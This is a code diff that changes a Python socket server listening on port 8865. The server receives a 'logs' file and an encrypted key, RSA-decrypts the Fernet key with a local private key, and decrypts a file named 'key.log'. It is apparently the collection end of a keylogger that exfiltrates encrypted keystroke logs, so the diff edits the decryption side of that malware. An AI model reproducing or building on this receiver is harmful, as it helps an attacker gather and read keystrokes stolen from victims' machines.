@@ -8,9 +8,12 @@ PORT = 8865
 # Define functions before socket binding
 
 
-def prep_key(enc_key):
+def prep_key(key_file):
+    enc_key = open(key_file, 'rb').read()
     priv_key = rsa.PrivateKey.load_pkcs1(open('private.pem', 'rb').read())
-    return Fernet(rsa.decrypt(enc_key, priv_key))
+    with open(key_file, 'wb') as keyfile:
+        keyfile.write(rsa.decrypt(enc_key, priv_key))
+    # return Fernet(rsa.decrypt(enc_key, priv_key))
 
 
 def decrypt_file(f_key: Fernet, file: str):
@@ -47,8 +50,8 @@ s.listen(5)
 recv_file()     # for logs
 recv_file()     # for key
 
-enc_key = open('fernet.key', 'rb').read()
-print(enc_key)
+key_file = 'fernet.key'
+prep_key(key_file)
 # Pass the file name as well
-decrypt_file(Fernet(enc_key), 'key.log')
+decrypt_file(Fernet(open('fernet.key', 'rb').read()), 'key.log')
 s.close()
